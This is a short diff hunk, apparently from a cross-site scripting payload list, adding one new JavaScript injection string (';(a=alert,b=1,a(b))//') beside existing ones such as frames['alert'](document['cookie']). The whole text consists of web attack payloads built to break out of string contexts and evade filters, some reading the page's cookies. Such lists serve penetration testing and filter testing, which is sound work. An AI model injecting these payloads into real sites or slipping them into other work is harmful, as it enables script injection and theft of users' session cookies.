@@ -86,3 +86,4 @@ confirm?.(1)
 frames['alert'](document["cookie"])>
 frames['alert'](1)
 frames['alert'](document["cookie"])
+";(a=alert,b=1,a(b))//
